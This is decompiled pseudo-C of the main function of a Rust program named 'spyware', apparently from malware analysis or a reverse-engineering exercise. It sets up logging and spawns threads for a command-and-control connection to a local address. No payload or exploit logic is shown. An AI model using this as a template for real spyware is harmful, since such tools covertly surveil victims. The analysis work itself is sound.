void spyware::main()
{
    unsigned long long v0;  // [bp-0xd8]
    int v1;  // [bp-0xd8]
    int v2;  // [bp-0xd8]
    int v3;  // [bp-0xd8]
    unsigned long long v4;  // [bp-0xd0]
    unsigned long long v5;  // [bp-0xc8]
    int v6;  // [bp-0xc8]
    int v7;  // [bp-0xc0], Other Possible Types: unsigned long long
    unsigned long long v8;  // [bp-0xb8]
    char v9;  // [bp-0xb0]
    unsigned int v10;  // [bp-0xaf]
    unsigned short v11;  // [bp-0xab]
    char v12;  // [bp-0xa9]
    void* v13;  // [bp-0xa0]
    unsigned long long v14;  // [bp-0x90]
    unsigned long long v15;  // [bp-0x88]
    unsigned long long v16;  // [bp-0x80]
    char v17;  // [bp-0x78]
    unsigned int v18;  // [bp-0x77]
    unsigned short v19;  // [bp-0x73]
    char v20;  // [bp-0x71]
    unsigned long long v21;  // [bp-0x70]
    unsigned long long v22;  // [bp-0x68]
    unsigned long long v23;  // [bp-0x60]
    unsigned long long v24;  // [bp-0x58]
    unsigned long long v25;  // [bp-0x50]
    int v26;  // [bp-0x48], Other Possible Types: char
    char v27;  // [bp-0x38]
    int v28;  // [bp-0x28], Other Possible Types: char
    char v29;  // [bp-0x18]
    unsigned long long v32;  // rdx

    spyware::init_logging();
    if (::0x4514b0::core::sync::atomic::atomic_load() >= 3)
    {
        v0 = &g_4b9430;
        v4 = 1;
        v5 = 8;
        *((uint128_t *)&v7) = 0;
        v21 = "spyware:Successfully connected to cnc server !Failed to connect to cnc server (), error: 127.0.0.1";
        v22 = 7;
        v23 = "spyware:Successfully connected to cnc server !Failed to connect to cnc server (), error: 127.0.0.1";
        v24 = 7;
        v25 = log::__private_api::loc(&g_4b9440);
        log::__private_api::log(&v0, 3, &v21);
    }
    v14 = 0x8000000000000000;
    v13 = 0;
    v17 = 0;
    v8 = v16;
    v9 = 0;
    v10 = v18;
    v11 = v19;
    v12 = v20;
    *((unsigned long long *)&v6) = 0x8000000000000000;
    v7 = v15;
    *((int128_t *)&v1) = *((int128_t *)&v13);
    v21.spawn_unchecked(&(unsigned long long)v3);
    v26.expect(&v21);
    (unsigned long long)v3.spawn_unchecked(&v13);
    v28.expect(&(unsigned long long)v3);
    *((int128_t *)&v6) = *((int128_t *)&v29);
    v2 = v28;
    (unsigned long long)v3.join().expect(v32, "The cnc connection has panicked.library/core/src/char/methods.rslibrary/std/src/thread/scoped.rsindex out of bounds: the len is Logging successfully initialized", 32, &g_4b9458);
    memcpy(&(unsigned long long)v6, &v27, 16);
    v3 = v26;
    (unsigned long long)v3.join().expect(v32, "The server connection has panicked.LoggingNotInitializedErrorLoggingSetupCalledTwiceLoggingInitializationError", 35, &g_4b9470);
    return;
}
